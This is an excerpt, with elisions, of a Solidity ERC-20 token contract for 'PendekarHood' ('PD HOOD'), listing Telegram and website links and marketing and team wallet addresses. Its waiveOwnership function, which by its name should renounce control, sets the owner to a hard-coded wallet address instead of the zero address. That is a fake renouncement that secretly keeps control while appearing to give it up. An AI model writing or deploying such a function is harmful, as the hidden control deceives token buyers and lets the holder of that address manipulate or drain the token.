...
/**
TELEGRAM : https://t.me/PendekarHoodOfficial
Website : https://pendekarhood.com/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xD9b0881F3EDe74d9eEbE599661ce4b406d42C165);
    }
...
contract PendekarHood is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PENDEKAR";
    string private _symbol = "PD HOOD";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x37bEcE277e639582B0409C63296Bd1A7B66eDc43);
    address payable public teamWalletAddress = payable(0x37bEcE277e639582B0409C63296Bd1A7B66eDc43);
